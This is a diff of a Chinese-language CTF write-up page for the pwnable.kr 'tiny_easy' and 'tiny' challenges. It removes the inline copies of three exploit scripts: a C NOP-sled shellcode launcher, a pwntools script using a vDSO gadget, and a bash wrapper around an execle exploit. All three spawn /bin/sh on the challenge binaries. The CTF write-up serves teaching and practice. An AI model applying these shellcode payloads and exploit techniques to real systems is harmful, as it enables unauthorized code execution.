@@ -220,37 +220,7 @@ Breakpoint 1, 0x08048054 in ?? ()
 
 <h6 id="exptinyeasyc">exp.tiny_easy.c</h6>
 
-<noscript><pre>#include &lt;stdio.h&gt;
-#include &lt;string.h&gt;
-#include &lt;unistd.h&gt;
-#include &lt;sys/wait.h&gt;
-
-char *shellcode = \
-     "\xeb\x16\x5e\x31\xd2\x52\x56\x89\xe1\x89\xf3\x31\xc0\xb0\x0b\xcd"
-     "\x80\x31\xdb\x31\xc0\x40\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69"
-     "\x6e\x2f\x73\x68";
-
-int main()
-{
-    char arg[130001];
-    int status;
-    memset(arg, '\x90', 130000);
-    strcpy(arg + 130000 - strlen(shellcode), shellcode);
-
-    for (;;) {
-        if (0 == fork())
-            execl("/home/tiny_easy/tiny_easy", "\xe0\xf0\x7c\xff",
-                    arg, arg, arg, arg, arg, arg, arg, arg,
-                    arg, arg, arg, arg, arg, arg, arg, arg,
-                    NULL);
-        wait(&amp;status);
-        if (WIFEXITED(status))
-            break;
-    }
-
-    return 0;
-}</pre></noscript>
-<div class="gist" data-gist="cubarco/03fb090852a3303f58db" data-gist-file="pwnable-rookiss-tiny-easy.c">Loading gist...</div>
+<div class="gist" data-gist="cubarco/03fb090852a3303f58db" data-gist-file="pwnable-rookiss-tiny-easy.c">Gist: cubarco/03fb090852a3303f58db</div>
 
 <h4 id="vdso2">2. vDSO<sup id="fnref:2"><a href="#fn:2" class="footnote">2</a></sup>
 </h4>
@@ -261,23 +231,7 @@ int main()
 
 <h6 id="exptinyeasypy">exp.tiny_easy.py</h6>
 
-<noscript><pre>#!/usr/bin/env python
-# coding=utf8
-
-from pwn import p32, process
-
-pop_ret = 0x55557b62  # "pop ecx; ret" from vdso
-
-shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73"
-             "\x68\x68\x2f\x62\x69\x6e\x89"
-             "\xe3\x89\xc1\x89\xc2\xb0\x0b"
-             "\xcd\x80\x31\xc0\x40\xcd\x80")
-
-argv = [p32(pop_ret), shellcode]
-
-p = process(argv, executable='/home/tiny_easy/tiny_easy')
-p.interactive()</pre></noscript>
-<div class="gist" data-gist="cubarco/03fb090852a3303f58db" data-gist-file="pwnable-rookiss-tiny-easy.py">Loading gist...</div>
+<div class="gist" data-gist="cubarco/03fb090852a3303f58db" data-gist-file="pwnable-rookiss-tiny-easy.py">Gist: cubarco/03fb090852a3303f58db</div>
 
 <h2 id="tiny">tiny</h2>
 
@@ -309,34 +263,7 @@ p.interactive()</pre></noscript>
 <h6 id="exptinysh">exp.tiny.sh</h6>
 <p>这个 exp 的核心是 C (其实就是一句<code class="highlighter-rouge">execle()</code>的事情), 用 shell 写只是为了方便，可以把<code class="highlighter-rouge">ulimit -s unlimited</code>这些命令放在一起(调试过程中还用到了其他命令，最后删的只剩 ulimit…)，而且用一个脚本解题本身是一件很酷的事情XD.</p>
 
-<noscript><pre>#!/usr/bin/env bash
-
-tempfile=$(mktemp -d)
-echo $tempfile
-cd $tempfile
-
-gcc -xc - -oexp &lt;&lt;\EOF
-#include &lt;stdio.h&gt;
-#include &lt;unistd.h&gt;
-
-int main()
-{
-    char *envp[] = {
-        "env1=1", "env2=2", "env3=3",
-        "/bin/sh", "env5=5", NULL
-    };
-    execle("/home/tiny/tiny", "\xc8\x75\x55\x55",
-           "A", "A", "A", "A", "A", "A",
-           "A", "A", "A", "A", NULL, envp);
-
-    return 0;
-}
-EOF
-
-ulimit -s unlimited
-
-exec ./exp</pre></noscript>
-<div class="gist" data-gist="cubarco/d379e31c9487c8ee07f2" data-gist-file="pwnable-hackerssecret-tiny.sh">Loading gist...</div>
+<div class="gist" data-gist="cubarco/d379e31c9487c8ee07f2" data-gist-file="pwnable-hackerssecret-tiny.sh">Gist: cubarco/d379e31c9487c8ee07f2</div>
 
 <h2 id="references">References</h2>
 
